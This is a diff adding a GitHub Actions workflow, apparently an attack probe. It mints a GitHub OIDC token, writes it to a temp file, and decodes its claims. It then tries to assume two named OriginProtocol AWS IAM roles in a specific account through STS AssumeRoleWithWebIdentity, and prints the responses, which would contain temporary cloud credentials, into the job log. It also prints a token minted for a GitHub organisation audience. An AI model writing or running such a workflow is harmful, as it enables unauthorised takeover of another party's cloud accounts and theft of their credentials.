@@ -1,0 +1,31 @@
+name: w12b10env
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: production
+    steps:
+      - name: mint and probe
+        run: |
+          set -uo pipefail
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN" > /tmp/t.jwt
+          python3 - <<'PYEOF'
+          import base64, json
+          t = open('/tmp/t.jwt').read().strip().split('.')
+          for p in t[:2]:
+              p += '=' * (-len(p) % 4)
+              print('CLAIM', json.dumps(json.loads(base64.urlsafe_b64decode(p)), sort_keys=True))
+          PYEOF
+          for ROLE in talos-gha-OriginProtocol-arm-oeth talos-gha-OriginProtocol-origin-dollar; do
+            echo "--- $ROLE"
+            curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10env" --data-urlencode "WebIdentityToken=$TOKEN" | tr -d '\n' | head -c 900
+            echo
+          done
+          echo "=== AUD RAW"
+          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fgithub.com%2FOriginProtocol" | head -c 600
+          echo
